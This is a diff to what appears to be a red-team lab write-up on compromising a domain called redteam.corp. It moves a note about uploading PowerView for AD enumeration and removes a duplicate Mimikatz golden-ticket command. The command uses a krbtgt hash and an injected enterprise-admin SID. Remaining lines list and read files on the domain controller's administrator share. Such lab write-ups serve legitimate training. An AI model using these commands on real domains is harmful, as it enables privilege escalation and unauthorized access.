@@ -455,6 +455,11 @@ kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-23
 ```
 
 ![[Pasted image 20250512211423.png]]
+# AD Enumeration 
+
+We uploaded PowerView to gather more information about the Active Directory environment.
+
+![[Pasted image 20250512210444.png]]
 
 ```python
 dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
@@ -463,15 +468,5 @@ dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
 ```python
 type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
 ```
-
-```python
-kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
-```
-# AD Enumeration 
-
-We uploaded PowerView to gather more information about the Active Directory environment.
-
-![[Pasted image 20250512210444.png]]
-
 
 ![[Pasted image 20250512212141.png]]
